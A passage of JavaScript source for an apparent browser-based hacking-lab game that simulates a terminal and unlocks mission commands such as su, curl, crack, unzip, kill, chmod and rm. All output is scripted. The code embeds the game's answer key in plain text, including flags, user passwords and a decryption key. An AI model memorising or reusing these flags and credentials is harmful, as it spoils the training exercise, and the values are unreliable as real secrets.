
          messages.push(`chmod: permissions of '${targetPath}' changed to ${mode}`);

          // Check for Mission 10 Completion
          if (filename === 'S99update_check' && mode === '000') {
              messages.push("------------------------------------------------");
              messages.push("SYSTEM ALERT: MALICIOUS SCRIPT DISABLED.");
              messages.push("THE SYSTEM IS SECURE.");
              messages.push("MISSION 10 COMPLETE.");
              messages.push("CONGRATULATIONS, YOU HAVE BEATEN THE LAB.");
              messages.push("Flag: " + MISSION_10_FLAGS[0]);
              messages.push("------------------------------------------------");
          }

      } else {
          messages.push(`chmod: ${targetPath}: No such file`);
      }
      return messages;
  };

  const executeRm = (targetPath, user) => {
      const messages = [];
      
      // Resolve path
      let pathStack = [];
      let filename = targetPath;
      
      if (targetPath.includes('/')) {
          const parts = targetPath.split('/');
          filename = parts.pop();
          
          if (targetPath.startsWith('/')) {
              pathStack = []; // Root
          } else if (targetPath.startsWith('~/')) {
              pathStack = ['~'];
          } else {
              pathStack = [...currentPath];
          }
          
          const dirParts = parts.filter(p => p && p !== '.' && p !== '~');
          for (const part of dirParts) {
              if (part === '..') {
                  if (pathStack.length > 0) pathStack.pop();
              } else {
                  pathStack.push(part);
              }
          }
      } else {
          pathStack = [...currentPath];
      }

      const dir = getDirectory(pathStack);
      if (dir && dir.children && dir.children[filename]) {
          const file = dir.children[filename];
          
          // Permission check
          if (user !== 'root' && file.owner !== user) {
              messages.push(`rm: cannot remove '${targetPath}': Permission denied`);
              return messages;
          }

          // Remove file
          setFileSystem(prev => {
              const newFS = JSON.parse(JSON.stringify(prev));
              let current = newFS;
              if (pathStack.length > 0 && pathStack[0] === '~') {
                  current = newFS['~'];
                  for (let i = 1; i < pathStack.length; i++) {
                      current = current.children[pathStack[i]];
                  }
              } else {
                  for (let i = 0; i < pathStack.length; i++) {
                       if (current[pathStack[i]]) current = current[pathStack[i]];
                       else if (current.children && current.children[pathStack[i]]) current = current.children[pathStack[i]];
                  }
              }

              if (current && current.children) {
                  delete current.children[filename];
              }
              return newFS;
          });

          messages.push(`rm: removed '${targetPath}'`);

          // Check for Mission 10 Completion
          if (filename === 'S99update_check') {
              messages.push("------------------------------------------------");
              messages.push("SYSTEM ALERT: MALICIOUS SCRIPT DELETED.");
              messages.push("THE SYSTEM IS SECURE.");
              messages.push("MISSION 10 COMPLETE.");
              messages.push("CONGRATULATIONS, YOU HAVE BEATEN THE LAB.");
              messages.push("Flag: " + MISSION_10_FLAGS[0]);
              messages.push("------------------------------------------------");
          }

      } else {
          messages.push(`rm: ${targetPath}: No such file`);
      }
      return messages;
  };

  const handleCommand = async (cmd) => {
    if (!cmd.trim() && !awaitingPassword) return;
    
    if (awaitingPassword) {
        const targetUser = awaitingPassword;
        setAwaitingPassword(null);
        // Don't echo password
        
        if (targetUser === '0xb007ab1e' && cmd === 'e1ba700b') {
            setTerminalUser('0xb007ab1e');
            setHistory(prev => [...prev, `Password accepted.`]);
            setCurrentPath(['home', '0xb007ab1e']);
        } else if (targetUser === 'crittercodes' && cmd === 'crittercodes') {
            setTerminalUser('crittercodes');
            setHistory(prev => [...prev, `Password accepted.`]);
            setHistory(prev => [...prev, `Welcome, Creator.`]);
        } else if (targetUser === 'root' && cmd === 'super_secret_admin_key_99') {
            setTerminalUser('root');
            setHistory(prev => [...prev, `Password accepted.`]);
            setCurrentPath([]);
        } else {
            setHistory(prev => [...prev, `su: Authentication failure`]);
        }
        setInput('');
        return;
    }

    const args = cmd.trim().split(' ');
    const command = args[0]; // Keep case for file paths
    const lowerCommand = command.toLowerCase();

    const promptChar = terminalUser === 'root' ? '#' : '$';
    const newHistory = [...history, `${terminalUser}@thelab:${currentPath.length === 0 ? '/' : currentPath.join('/')}${promptChar} ${cmd}`];
    setHistory(newHistory); // Update history immediately with command

    // Add to command history
    setCommandHistory(prev => [cmd, ...prev]);
    setHistoryIndex(-1);

    // Check for script execution (./script.sh or /path/to/script.sh)
    if (command.startsWith('./') || command.startsWith('/') || command.endsWith('.sh')) {
        let targetPath = command;
        let pathStack = [];
        
        if (command.startsWith('./')) {
            pathStack = [...currentPath];
            targetPath = command.substring(2);
        } else if (command.startsWith('/')) {
            pathStack = [];
            targetPath = command.substring(1);
        } else {
            // Try current directory
            pathStack = [...currentPath];
        }

        // Resolve path to file
        const parts = targetPath.split('/').filter(p => p);
        const filename = parts.pop();
        
        // Navigate to dir
        for (const part of parts) {
            if (part === '..') {
                if (pathStack.length > 0) pathStack.pop();
            } else if (part !== '.') {
                pathStack.push(part);
            }
        }

        const dir = getDirectory(pathStack);
        if (dir && dir.children && dir.children[filename]) {
            const file = dir.children[filename];
            if (file.type === 'file') {
                if (filename.endsWith('.sh')) {
                    await executeScript(filename, file.content);
                    setInput('');
                    return;
                } else {
                    setHistory(prev => [...prev, `bash: ${command}: Permission denied`]);
                    setInput('');
                    return;
                }
            }
        }
        
        if (command.includes('/')) {
             setHistory(prev => [...prev, `bash: ${command}: No such file or directory`]);
             setInput('');
             return;
        }
    }

    switch (lowerCommand) {
      case 'help':
        if (args[1]) {
            const cmd = args[1].toLowerCase();
            switch (cmd) {
                case 'ls':
                    newHistory.push("Usage: ls [options] [path]");
                    newHistory.push("List information about the FILEs (the current directory by default).");
                    newHistory.push("Options:");
                    newHistory.push("  -a      do not ignore entries starting with .");
                    break;
                case 'cd':
                    newHistory.push("Usage: cd <dir>");
                    newHistory.push("Change the shell working directory.");
                    break;
                case 'cat':
                    newHistory.push("Usage: cat <file>");
                    newHistory.push("Concatenate FILE(s) to standard output.");
                    break;
                case 'grep':
                    newHistory.push("Usage: grep <pattern> <file>");
                    newHistory.push("Search for PATTERN in FILE.");
                    break;
                case 'curl':
                    newHistory.push("Usage: curl [options] <url>");
                    newHistory.push("Transfer data from or to a server.");
                    newHistory.push("Options:");
                    newHistory.push("  -X <method>   Specify request method (GET, POST, etc.)");
                    break;
                case 'ps':
                    newHistory.push("Usage: ps [options]");
                    newHistory.push("Report a snapshot of the current processes.");
                    newHistory.push("Options:");
                    newHistory.push("  -aux, -ef, -a   Show all processes (including those of other users)");
                    break;
                case 'kill':
                    newHistory.push("Usage: kill <pid>");
                    newHistory.push("Send a signal to terminate a process.");
                    break;
                case 'chmod':
                    newHistory.push("Usage: chmod <mode> <file>");
                    newHistory.push("Change the file mode bits.");
                    newHistory.push("Example: chmod 777 file.txt");
                    break;
                case 'rm':
                    newHistory.push("Usage: rm <file>");
                    newHistory.push("Remove (unlink) the FILE(s).");
                    break;
                case 'su':
                    newHistory.push("Usage: su <user>");
                    newHistory.push("Change the effective user ID and group ID to that of USER.");
                    break;
                case 'crack':
                    newHistory.push("Usage: crack <hash> <wordlist>");
                    newHistory.push("Attempt to crack a password hash using a dictionary attack.");
                    break;
                case 'unzip':
                    newHistory.push("Usage: unzip <file> [-p <password>]");
                    newHistory.push("Extract compressed files in a ZIP archive.");
                    break;
                case 'strings':
                    newHistory.push("Usage: strings <file>");
                    newHistory.push("Print the sequences of printable characters in a file.");
                    break;
                case 'decrypt':
                    newHistory.push("Usage: decrypt <file> <key>");
                    newHistory.push("Decrypt a file using the specified key.");
                    break;
                default:
                    newHistory.push(`No help entry for '${cmd}'`);
            }
            break;
        }

        const helpText = [
          "Available commands:",
          "  help [cmd] - Show help for a specific command",
          "  ls       - List directory contents",
          "  cd <dir> - Change directory",
          "  cat <file> - Read file content",
          "  clear    - Clear terminal",
          "  whoami   - Display current user",
          "  submit <flag> - Submit a flag for rewards",
          "  mission  - Show current mission status",
          "  pwd      - Print working directory",
          "  ledger   - Show stake transaction history"
        ];
        if (missionLevel >= 2) {
          helpText.push("  decrypt <file> <key> - Decrypt a file");
        }
        if (missionLevel >= 3) {
            helpText.push("  grep <pattern> <file> - Search for pattern in file");
            helpText.push("  curl <url> - Transfer data from or to a server");
        }
        if (missionLevel >= 5) {
            helpText.push("  crack <hash> <wordlist> - Crack a password hash");
            helpText.push("  unzip <file> - Extract compressed files");
        }
        if (missionLevel >= 6) {
            helpText.push("  su <user> - Switch user");
            helpText.push("  exit - Log out of current user");
        }
        if (missionLevel >= 8) {
            helpText.push("  ps - List running processes");
            helpText.push("  kill <pid> - Terminate a process");
        }
        if (missionLevel >= 9) {
            helpText.push("  strings <file> - Find printable strings in a binary");
        }
        if (missionLevel >= 10) {
            helpText.push("  chmod <mode> <file> - Change file permissions");
            helpText.push("  rm <file> - Remove a file");
        }
        newHistory.push(...helpText);
        break;
      case 'su':
        if (missionLevel < 6) {
            newHistory.push(`Command not found: ${command}`);
            break;
        }
        if (!args[1]) {
            newHistory.push("Usage: su <username>");
        } else {
            const targetUser = args[1];
            if (targetUser === '0xb007ab1e') {
                setAwaitingPassword(targetUser);
                newHistory.push("Password: ");
            } else if (targetUser === 'crittercodes') {
                setAwaitingPassword(targetUser);
                newHistory.push("Password: ");
            } else if (targetUser === 'root') {
                setAwaitingPassword(targetUser);
                newHistory.push("Password: ");
            } else {
                newHistory.push(`su: User ${targetUser} does not exist`);
            }
        }
        break;
      case 'pwd':
        newHistory.push(currentPath.length === 0 ? '/' : (currentPath[0] === '~' ? currentPath.join('/') : '/' + currentPath.join('/')));
        break;
      case 'ledger':
        if (stakeHistory.length === 0) {
            newHistory.push("No transactions found.");
        } else {
            newHistory.push("STAKE TRANSACTION LEDGER");
            newHistory.push("----------------------------------------");
            newHistory.push("DATE       | AMOUNT | REASON");
            newHistory.push("----------------------------------------");
            stakeHistory.forEach(tx => {
                const date = new Date(tx.timestamp).toLocaleDateString();
                const amount = tx.amount.toString().padEnd(6);
                newHistory.push(`${date} | ${amount} | ${tx.reason}`);
            });
            newHistory.push("----------------------------------------");
        }
        break;
      case 'grep':
        if (missionLevel < 3) {
            newHistory.push(`Command not found: ${command}`);
            break;
        }
        if (!args[1] || !args[2]) {
            newHistory.push("Usage: grep <pattern> <file>");
        } else {
            const pattern = args[1];
            const targetPath = args[2];
            
            // Resolve path
            let pathStack = [];
            let filename = targetPath;
            
            if (targetPath.includes('/')) {
                const parts = targetPath.split('/');
                filename = parts.pop();
                
                if (targetPath.startsWith('/')) {
                    pathStack = []; // Root
                } else if (targetPath.startsWith('~/')) {
                    pathStack = ['~'];
                } else {
                    pathStack = [...currentPath];
                }
                
                const dirParts = parts.filter(p => p && p !== '.' && p !== '~');
                for (const part of dirParts) {
                    if (part === '..') {
                        if (pathStack.length > 0) pathStack.pop();
                    } else {
                        pathStack.push(part);
                    }
                }
            } else {
                pathStack = [...currentPath];
            }

            const dir = getDirectory(pathStack);
            if (dir && dir.children && dir.children[filename] && dir.children[filename].type === 'file') {
                const content = dir.children[filename].content;
                const lines = content.split('\n');
                const matches = lines.filter(line => line.includes(pattern));
                if (matches.length > 0) {
                    newHistory.push(...matches);
                }
            } else {
                newHistory.push(`grep: ${targetPath}: No such file`);
            }
        }
        break;
      case 'curl':
        if (missionLevel < 3) {
            newHistory.push(`Command not found: ${command}`);
            break;
        }
        if (!args[1]) {
            newHistory.push("Usage: curl <url> [options]");
        } else {
            // Parse args for -X POST
            let method = 'GET';
            let url = '';
            
            for (let i = 1; i < args.length; i++) {
                if (args[i] === '-X' && args[i+1]) {
                    method = args[i+1];
                    i++;
                } else if (!args[i].startsWith('-')) {
                    url = args[i];
                }
            }

            if (!url) {
                 newHistory.push("curl: no URL specified!");
                 break;
            }

            newHistory.push(`Connecting to ${url}...`);
            
            // Mission 4 Logic
            if (url === '10.0.0.5' || url === 'http://10.0.0.5') {
                setTimeout(() => {
                    setHistory(prev => [...prev, "HTTP/1.1 200 OK", "Content-Type: text/plain", "", "PRINTER FARM CONTROL NODE", "Status: ONLINE", "Jobs: 0", "Flag: flag{internal_network_mapped}"]);
                }, 1000);
            } else if (url === '10.0.0.6' || url === 'http://10.0.0.6') {
                 setTimeout(() => {
                    setHistory(prev => [...prev, "HTTP/1.1 403 Forbidden", "Access Denied. SSH Required."]);
                }, 1000);
            } else if (url.includes('fablabfortsmith.org/api/debug') || url.includes('www.fablabfortsmith.org/api/debug')) {
                // Mission 7 Logic
                if (method === 'POST') {
                    setTimeout(() => {
                        setHistory(prev => [...prev, "HTTP/1.1 200 OK", "Content-Type: application/json", "", "{", '  "status": "success",', '  "message": "Debug endpoint accessed.",', '  "flag": "flag{api_backdoor_discovered}",', '  "log": "Last access IP: 192.168.1.66 (Unknown Host)"', "}"]);
                    }, 1000);
                } else {
                    setTimeout(() => {
                        setHistory(prev => [...prev, "HTTP/1.1 405 Method Not Allowed", "Allow: POST"]);
                    }, 1000);
                }
            } else if (url.includes('/api/debug')) {
                 setTimeout(() => {
                    setHistory(prev => [...prev, "curl: (6) Could not resolve host: localhost", "Did you mean www.fablabfortsmith.org?"]);
                }, 1000);
            } else {
                setTimeout(() => {
                    setHistory(prev => [...prev, "curl: (7) Failed to connect to host"]);
                }, 1000);
            }
        }
        break;
      case 'ps':
        if (missionLevel < 8) {
            newHistory.push(`Command not found: ${command}`);
            break;
        }
        
        const showAll = args.includes('-aux') || args.includes('-ef') || args.includes('-a');

        newHistory.push("PID   USER     %CPU COMMAND");
        newHistory.push("1     root     0.1  init");
        newHistory.push("1234  root     0.0  sshd");
        newHistory.push("1337  guest    0.0  bash");
        newHistory.push("1402  root     0.2  dockerd");
        
        if (!capturedFlags.includes(MISSION_8_FLAGS[0])) {
            if (showAll) {
                newHistory.push("9999  unknown  99.9 ./nemesis_v1");
            }
        }
        if (!showAll && !capturedFlags.includes(MISSION_8_FLAGS[0])) {
             newHistory.push("... (use -aux to see all processes)");
        }
        break;
      case 'kill':
        if (missionLevel < 8) {
            newHistory.push(`Command not found: ${command}`);
            break;
        }
        if (!args[1]) {
            newHistory.push("Usage: kill <pid>");
        } else {
            const pid = args[1];
            if (pid === '9999') {
                if (capturedFlags.includes(MISSION_8_FLAGS[0])) {
                    newHistory.push(`kill: (${pid}) - No such process`);
                } else {
                    newHistory.push(`[1]+  Terminated    ./nemesis_v1`);
                    newHistory.push("Process 9999 stopped.");
                    newHistory.push("Logic bomb defused.");
                    newHistory.push("Memory Dump: flag{logic_bomb_defused}");
                    // Auto-submit logic handled by user manually submitting flag
                }
            } else if (['1', '1234', '1337', '1402'].includes(pid)) {
                newHistory.push(`kill: (${pid}) - Operation not permitted`);
            } else {
                newHistory.push(`kill: (${pid}) - No such process`);
            }
        }
        break;
      case 'strings':
        if (missionLevel < 9) {
            newHistory.push(`Command not found: ${command}`);
            break;
        }
        if (!args[1]) {
            newHistory.push("Usage: strings <file>");
        } else {
            const targetPath = args[1];
            
            // Resolve path (simplified reuse of cat logic)
            let pathStack = [];
            let filename = targetPath;
            
            if (targetPath.includes('/')) {
                const parts = targetPath.split('/');
                filename = parts.pop();
                
                if (targetPath.startsWith('/')) {
                    pathStack = []; // Root
                } else if (targetPath.startsWith('~/')) {
                    pathStack = ['~'];
                } else {
                    pathStack = [...currentPath];
                }
                
                const dirParts = parts.filter(p => p && p !== '.' && p !== '~');
                for (const part of dirParts) {
                    if (part === '..') {
                        if (pathStack.length > 0) pathStack.pop();
                    } else {
                        pathStack.push(part);
                    }
                }
            } else {
                pathStack = [...currentPath];
            }

            const dir = getDirectory(pathStack);
            if (dir && dir.children && dir.children[filename] && dir.children[filename].type === 'file') {
                const content = dir.children[filename].content;
                // Simulate strings behavior: find printable sequences >= 4 chars
                const matches = content.match(/[ -~]{4,}/g);
                if (matches) {
                    newHistory.push(...matches);
                } else {
                    newHistory.push("strings: no printable strings found");
                }
            } else {
                newHistory.push(`strings: ${targetPath}: No such file`);
            }
        }
        break;
      case 'chmod':
        if (missionLevel < 10) {
            newHistory.push(`Command not found: ${command}`);
            break;
        }
        if (!args[1] || !args[2]) {
            newHistory.push("Usage: chmod <mode> <file>");
        } else {
            const messages = executeChmod(args[1], args[2], terminalUser);
            newHistory.push(...messages);
        }
        break;
      case 'rm':
        if (missionLevel < 10) {
            newHistory.push(`Command not found: ${command}`);
            break;
        }
        if (!args[1]) {
            newHistory.push("Usage: rm <file>");
        } else {
            const messages = executeRm(args[1], terminalUser);
            newHistory.push(...messages);
        }
        break;
      case 'crack':
        if (missionLevel < 5) {
            newHistory.push(`Command not found: ${command}`);
            break;
        }
        if (!args[1] || !args[2]) {
            newHistory.push("Usage: crack <hash> <wordlist>");
        } else {
            const hash = args[1];
            const wordlistPath = args[2];
            
            // Validate wordlist path (must be /usr/share/dict/words for now)
            if (wordlistPath !== '/usr/share/dict/words') {
                newHistory.push(`crack: ${wordlistPath}: Invalid wordlist or file not found`);
                break;
            }

            // Check if hash matches the admin hash from shadow file
            // admin:$1$5231a$7823...
            if (hash === '$1$5231a$7823...') {
                newHistory.push("Starting dictionary attack...");
                newHistory.push(`Using wordlist: ${wordlistPath}`);
                
                setTimeout(() => {
                    setHistory(prev => [...prev, "Progress: 25%...", "Progress: 50%...", "Progress: 75%..."]);
                    setTimeout(() => {
                        setHistory(prev => [...prev, "MATCH FOUND!", "Password: maker"]);
                    }, 2000);
                }, 1000);
            } else {
                newHistory.push("Starting dictionary attack...");
                setTimeout(() => {
                    setHistory(prev => [...prev, "Progress: 100%", "No match found."]);
                }, 1500);
            }
        }
        break;
      case 'unzip':
        if (missionLevel < 5) {
            newHistory.push(`Command not found: ${command}`);
            break;
        }
        if (!args[1]) {
            newHistory.push("Usage: unzip <file>");
        } else {
            const filename = args[1];
            // Simple check for the specific file
            if (filename.includes('secure_data.zip')) {
                // Prompt for password (simulated by checking next input? No, let's just ask for it in args for simplicity or use a prompt state)
                // For simplicity in this terminal emulator, let's require: unzip <file> -p <password>
                
                const passwordIndex = args.indexOf('-p');
                if (passwordIndex !== -1 && args[passwordIndex + 1]) {
                    const password = args[passwordIndex + 1];
                    if (password === 'maker') {
                        newHistory.push(`Archive:  ${filename}`);
                        newHistory.push("  inflating: history.txt");
                        newHistory.push("  inflating: community.txt");
                        newHistory.push("  inflating: board_minutes.txt");
                        
                        // Actually add the files to the file system
                        setFileSystem(prev => {
                            const newFS = JSON.parse(JSON.stringify(prev));
                            
                            // Resolve current directory in newFS
                            let targetDir = newFS;
                            if (currentPath.length > 0) {
                                if (currentPath[0] === '~') {
                                    targetDir = newFS['~'];
                                    for (let i = 1; i < currentPath.length; i++) {
                                        if (targetDir.children && targetDir.children[currentPath[i]]) {
                                            targetDir = targetDir.children[currentPath[i]];
                                        }
                                    }
                                } else {
                                    if (newFS[currentPath[0]]) {
                                        targetDir = newFS[currentPath[0]];
                                        for (let i = 1; i < currentPath.length; i++) {
                                            if (targetDir.children && targetDir.children[currentPath[i]]) {
                                                targetDir = targetDir.children[currentPath[i]];
                                            }
                                        }
                                    }
                                }
                            }

                            let container = targetDir;
                            if (targetDir.type === 'dir') {
                                if (!targetDir.children) targetDir.children = {};
                                container = targetDir.children;
                            }

                            container['history.txt'] = { type: 'file', content: "The Lab was founded in the old ACHE building. It started as a small group of makers and has grown into a community hub.\nWe honor our roots and the hackers who came before us.\n\nflag{ache_building_legacy}" };
                            container['community.txt'] = { type: 'file', content: "We are proud supporters of the 2600 hacker group.\nShell on the Border meets every first Friday.\nKeep the spirit alive.\n\nflag{shell_on_the_border_forever}" };
                            container['board_minutes.txt'] = { type: 'file', content: "Board Meeting - Dec 2025\nAttendees: Shyft (President), CritterCodes (CEO), Moon Captain (Secretary), 0xb007ab1e (Treasurer)\n\nAgenda:\n1. Budget approval for new 3D printers.\n2. Security audit results (Needs attention).\n3. Upcoming hackathon planning.\n\nCONFIDENTIAL: flag{admin_access_granted}" };
                            return newFS;
                        });
                    } else {
                        newHistory.push("unzip: incorrect password");
                    }
                } else {
                    newHistory.push("Usage: unzip <file> -p <password>");
                }
            } else {
                newHistory.push(`unzip: cannot find or open ${filename}`);
            }
        }
        break;
      case 'clear':
        setHistory([]);
        setInput('');
        return;
      case 'whoami':
        newHistory.push(terminalUser);
        break;
      case 'exit':
        if (terminalUser !== (session?.user?.username || 'guest')) {
            setTerminalUser(session?.user?.username || 'guest');
            setCurrentPath(['~']);
            newHistory.push("logout");
        } else {
            newHistory.push("exit: logout not allowed from main shell");
        }
        break;
      case 'ls':
        let targetDirObj = null;
        let shouldList = true;
        let showHidden = false;

        // Parse arguments for flags
        const cleanArgs = args.filter(arg => {
          if (arg === '-a') {
            showHidden = true;
            return false;
          }
          return true;
        });

        if (!cleanArgs[1]) {
          targetDirObj = getDirectory(currentPath);
        } else {
          const target = cleanArgs[1].replace(/\/$/, '');
          if (target === '~') {
            targetDirObj = getDirectory(['~']);
          } else if (target === '/') {
             if (missionLevel < 2) {
                 newHistory.push("ls: /: Permission denied (Restricted Shell)");
                 shouldList = false;
             } else {
                 targetDirObj = getDirectory([]);
             }
          } else if (target === '..') {
            if (currentPath.length > 1) {
              targetDirObj = getDirectory(currentPath.slice(0, -1));
            } else {
              if (currentPath[0] === '~') {
                 if (missionLevel < 2) {
                     newHistory.push("ls: ..: Permission denied (Restricted Shell)");
                     shouldList = false;
                 } else {
                     targetDirObj = getDirectory([]);
                 }
              } else if (currentPath.length === 0) {
                 targetDirObj = getDirectory([]);
              }
            }
          } else {
            // Handle absolute paths or relative
            if (target.startsWith('/')) {
                if (missionLevel < 2) {
                    newHistory.push(`ls: ${target}: Permission denied (Restricted Shell)`);
                    shouldList = false;
                } else {
                    const parts = target.split('/').filter(p => p);
                    let current = fileSystem;
                    let found = true;
                    for (const p of parts) {
                        if (current[p]) current = current[p];
                        else if (current.children && current.children[p]) current = current.children[p];
                        else { found = false; break; }
                    }
                    if (found) targetDirObj = current;
                    else {
                        newHistory.push(`ls: ${target}: No such file or directory`);
                        shouldList = false;
                    }
                }
            } else {
                const currentDirObj = getDirectory(currentPath);
                let children;
                if (currentDirObj === fileSystem) children = fileSystem;
                else children = currentDirObj.children;

                if (children && children[target]) {
                  const child = children[target];
                  if (child.type === 'dir') {
                    targetDirObj = child;
                  } else {
                    newHistory.push(target);
                    shouldList = false;
                  }
                } else {
                  newHistory.push(`ls: ${target}: No such file or directory`);
                  shouldList = false;
                }
            }
          }
        }

        if (shouldList && targetDirObj) {
            // PERMISSION CHECK
            if (targetDirObj.owner && targetDirObj.owner !== terminalUser) {
                newHistory.push(`ls: Permission denied`);
                break;
            }

            let children;
            if (targetDirObj === fileSystem) {
                children = fileSystem;
            } else {
                children = targetDirObj.children || {};
            }
            
            const items = Object.keys(children)
            .filter(name => showHidden || !name.startsWith('.'))
            .map(name => {
              const item = children[name];
              return item.type === 'dir' ? `${name}/` : name;
            });
          newHistory.push(items.join('  '));
        }
        break;
      case 'cd':
        if (!args[1]) {
          setCurrentPath(['~']);
        } else {
          let targetPath = args[1];
          
          // Handle restricted shell for root access attempts
          if (missionLevel < 2) {
              if (targetPath.startsWith('/') || (targetPath.startsWith('..') && currentPath.length === 1 && currentPath[0] === '~')) {
                  newHistory.push(`cd: ${targetPath}: Permission denied (Restricted Shell)`);
                  break;
              }
          }

          // Determine starting point
          let newPathStack = [];
          if (targetPath.startsWith('/')) {
              newPathStack = []; // Start at root
          } else if (targetPath.startsWith('~/')) {
              newPathStack = ['~'];
              targetPath = targetPath.substring(2);
          } else if (targetPath === '~') {
              newPathStack = ['~'];
              targetPath = '';
          } else {
              newPathStack = [...currentPath]; // Start at current
          }

          const parts = targetPath.split('/').filter(p => p && p !== '.');
          
          let validPath = true;
          
          // Simulate the traversal to validate
          // We need to check validity at each step or at least at the end?
          // Better to check at each step to ensure we don't traverse into non-existent dirs
          
          // However, our getDirectory function takes a full path array.
          // So let's build the candidate path first, handling ..
          
          for (const part of parts) {
              if (part === '..') {
                  if (newPathStack.length > 0) {
                      newPathStack.pop();
                  }
              } else {
                  newPathStack.push(part);
              }
          }

          // Now validate if newPathStack exists and is a directory
          const targetDir = getDirectory(newPathStack);
          
          // PERMISSION CHECK
          if (targetDir && targetDir.owner && targetDir.owner !== terminalUser) {
              newHistory.push(`cd: Permission denied`);
              break;
          }
          
          // Special case for root directory which is the fileSystem object itself
          const isRoot = newPathStack.length === 0;
          
          if (targetDir && (targetDir.type === 'dir' || isRoot)) {
              setCurrentPath(newPathStack);
          } else {
              // Check if it's a file
              if (targetDir && targetDir.type === 'file') {
                  newHistory.push(`cd: ${targetPath}: Not a directory`);
              } else {
                  let hint = "";
                  // Check if it exists in parent (if we are not at root)
                  if (currentPath.length > 0 && !targetPath.includes('/')) {
                      const parentPath = currentPath.slice(0, -1);
                      const parentDir = getDirectory(parentPath);
                      if (parentDir && parentDir.children && parentDir.children[targetPath]) {
                          hint = ` (Did you mean '../${targetPath}'?)`;
                      }
                  }
                  
                  newHistory.push(`cd: ${targetPath}: No such directory${hint}`);
              }
          }
        }
        break;
      case 'cat':
        if (!args[1]) {
          newHistory.push("Usage: cat <filename>");
        } else {
          const parts = args[1].split('/');
          const fileName = parts.pop();
          const dirPathParts = parts;

          let targetDirPath = [...currentPath];
          
          // Handle absolute paths roughly
          if (args[1].startsWith('/')) {
             const absParts = args[1].split('/').filter(p => p);
             const absFileName = absParts.pop();
             let current = fileSystem;
             let found = true;
             for (const p of absParts) {
                 if (current[p]) current = current[p];
                 else if (current.children && current.children[p]) current = current.children[p];
                 else { found = false; break; }
             }
             if (found && current.children && current.children[absFileName]) {
                 if (current.children[absFileName].type === 'file') {
                     if (current.children[absFileName].content.startsWith('ELF')) {
                         newHistory.push(`(Binary file)`);
                     } else {
                         newHistory.push(current.children[absFileName].content);
                     }
                 } else {
                     newHistory.push(`cat: ${args[1]}: Is a directory`);
                 }
             } else {
                 newHistory.push(`cat: ${args[1]}: No such file`);
             }
             break;
          }

          if (dirPathParts.length > 0 && dirPathParts[0] === '~') {
              targetDirPath = ['~'];
              dirPathParts.shift();
          }

          for (const part of dirPathParts) {
              if (part === '' || part === '.') continue;
              if (part === '..') {
                  if (targetDirPath.length > 0) targetDirPath.pop();
              } else {
                  targetDirPath.push(part);
              }
          }

          const targetDir = getDirectory(targetDirPath);
          
          // PERMISSION CHECK
          if (targetDir && targetDir.owner && targetDir.owner !== terminalUser) {
              newHistory.push(`cat: Permission denied`);
              break;
          }
          
          if (targetDir && targetDir.children && targetDir.children[fileName]) {
            const file = targetDir.children[fileName];
            if (file.type === 'file') {
              if (file.content.startsWith('ELF')) {
                  newHistory.push(`(Binary file)`);
              } else {
                  newHistory.push(file.content);
              }
            } else {
              newHistory.push(`cat: ${args[1]}: Is a directory`);
            }
          } else {
            newHistory.push(`cat: ${args[1]}: No such file`);
          }
        }
        break;
      case 'decrypt':
        if (missionLevel < 2) {
            newHistory.push(`Command not found: ${command}`);
            break;
        }
        if (!args[1] || !args[2]) {
            newHistory.push("Usage: decrypt <file> <key>");
        } else {
            if (args[1] === 'payload.enc' && args[2] === 'super_secret_admin_key_99') {
                newHistory.push("Decrypting payload...");
                newHistory.push("Access Granted.");
                newHistory.push("Override Code: flag{protocol_override_initiated}");
            } else {
                newHistory.push("Decryption Failed: Invalid key or file.");
            }
        }
        break;
      case 'mission':
        newHistory.push(`CURRENT MISSION: LEVEL ${missionLevel}`);
        newHistory.push("------------------------------------------------");
        
        if (missionLevel === 1) {
            newHistory.push("OBJECTIVE: INITIAL ACCESS");
            newHistory.push("Find the hidden flags to gain access to the system.");
            newHistory.push("Progress:");
            MISSION_1_FLAGS.forEach(flag => {
                const captured = capturedFlags.includes(flag);
                // Don't reveal the exact flag string if not captured, maybe give a hint?
                // For now, just "Hidden Flag" is fine.
                let label = "Hidden Flag";
                if (flag === "flag{welcome_to_the_lab}") label = "Welcome Flag";
                else if (flag === "flag{curiosity_killed_the_cat_but_satisfaction_brought_it_back}") label = "Project Omega";
                else if (flag === "flag{hack_the_planet}") label = "System Flag";
                
                newHistory.push(`[${captured ? 'X' : ' '}] ${label}`);
            });
            newHistory.push(`Total: ${MISSION_1_FLAGS.filter(f => capturedFlags.includes(f)).length}/${MISSION_1_FLAGS.length}`);
        } else if (missionLevel === 2) {
            newHistory.push("OBJECTIVE: OPERATION BLACKOUT");
            newHistory.push("Decrypt the payload file to override the lockout.");
            newHistory.push("Progress:");
            const captured = capturedFlags.includes(MISSION_2_FLAGS[0]);
            newHistory.push(`[${captured ? 'X' : ' '}] Decrypt Payload`);
        } else if (missionLevel === 3) {
            newHistory.push("OBJECTIVE: SYSTEM RESTORATION");
            newHistory.push("Restore the database configuration.");
            newHistory.push("Progress:");
            const captured = capturedFlags.includes(MISSION_3_FLAGS[0]);
            newHistory.push(`[${captured ? 'X' : ' '}] Restore System`);
        } else if (missionLevel === 4) {
            newHistory.push("OBJECTIVE: NETWORK DISCOVERY");
            newHistory.push("Map the internal network.");
            newHistory.push("Progress:");
            const captured = capturedFlags.includes(MISSION_4_FLAGS[0]);
            newHistory.push(`[${captured ? 'X' : ' '}] Map Network`);
        } else if (missionLevel === 5) {
            newHistory.push("OBJECTIVE: INFORMATION GATHERING");
            newHistory.push("Uncover the Lab's history.");
            newHistory.push("Progress:");
            MISSION_5_FLAGS.forEach((flag, i) => {
                const captured = capturedFlags.includes(flag);
                let label = `Legacy Data Fragment #${i+1}`;
                if (flag === "flag{ache_building_legacy}") label = "History File";
                if (flag === "flag{shell_on_the_border_forever}") label = "Community File";
                if (flag === "flag{admin_access_granted}") label = "Board Minutes";

                newHistory.push(`[${captured ? 'X' : ' '}] ${label}`);
            });
            newHistory.push(`Total: ${MISSION_5_FLAGS.filter(f => capturedFlags.includes(f)).length}/${MISSION_5_FLAGS.length}`);
        } else if (missionLevel === 6) {
            newHistory.push("OBJECTIVE: PRIVILEGE ESCALATION");
            newHistory.push("Access the Treasurer's ledger.");
            newHistory.push("Progress:");
            const captured = capturedFlags.includes(MISSION_6_FLAGS[0]);
            newHistory.push(`[${captured ? 'X' : ' '}] Access Ledger`);
        } else if (missionLevel === 7) {
            newHistory.push("OBJECTIVE: WEB APPLICATION SECURITY");
            newHistory.push("Find and exploit the backdoor in the web server.");
            newHistory.push("Progress:");
